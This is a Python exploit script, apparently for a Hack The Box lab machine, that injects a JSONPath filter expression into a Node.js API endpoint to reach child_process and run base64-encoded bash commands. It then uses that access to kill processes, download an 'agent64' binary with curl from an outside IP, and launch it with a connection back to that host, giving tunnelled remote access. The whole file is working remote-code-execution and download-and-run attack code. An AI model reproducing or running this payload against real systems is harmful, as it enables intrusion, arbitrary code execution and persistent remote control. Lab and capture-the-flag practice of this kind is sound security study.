#!/usr/bin/env python3
import base64
import time
import requests
import sys

BASE = "http://10.129.115.125:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"
URL = f"{BASE}/api/v1/aegis-mds/_diag/{TOKEN}/jpquery"


def run(cmd: str, timeout: float = 15.0) -> None:
    b64 = base64.b64encode(cmd.encode()).decode()
    inner = (
        "this.process.mainModule.require('child_process')"
        f".exec('echo {b64}|base64 -d|bash')"
    )
    expr = (
        f"$..[?(p=\"{inner}\";"
        f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )
    print(f"len={len(expr)} cmd={cmd[:90]}", flush=True)
    if len(expr) > 512:
        print("TOO LONG", flush=True)
        return
    try:
        r = requests.post(
            URL,
            headers=HEADERS,
            json={"context": "registration", "expr": expr},
            timeout=timeout,
        )
        print(r.status_code, r.text[:120], flush=True)
    except Exception as e:
        print(type(e).__name__, e, flush=True)


if __name__ == "__main__":
    step = sys.argv[1] if len(sys.argv) > 1 else "all"
    if step in ("kill", "all"):
        run("pkill -9 -f chisel; pkill -9 curl; sleep 1; echo KILLED")
        time.sleep(2)
    if step in ("dl", "all"):
        run(
            "curl -fsSL -o /tmp/agent64 http://10.10.15.183:8090/agent64 && "
            "chmod +x /tmp/agent64 && ls -la /tmp/agent64 >/tmp/ast",
            timeout=40,
        )
        time.sleep(2)
    if step in ("start", "all"):
        run(
            "pkill -f agent64; "
            "nohup /tmp/agent64 -connect 10.10.15.183:11601 -ignore-cert "
            ">/tmp/agent.log 2>&1 & sleep 2; cat /tmp/ast /tmp/agent.log",
            timeout=15,
        )
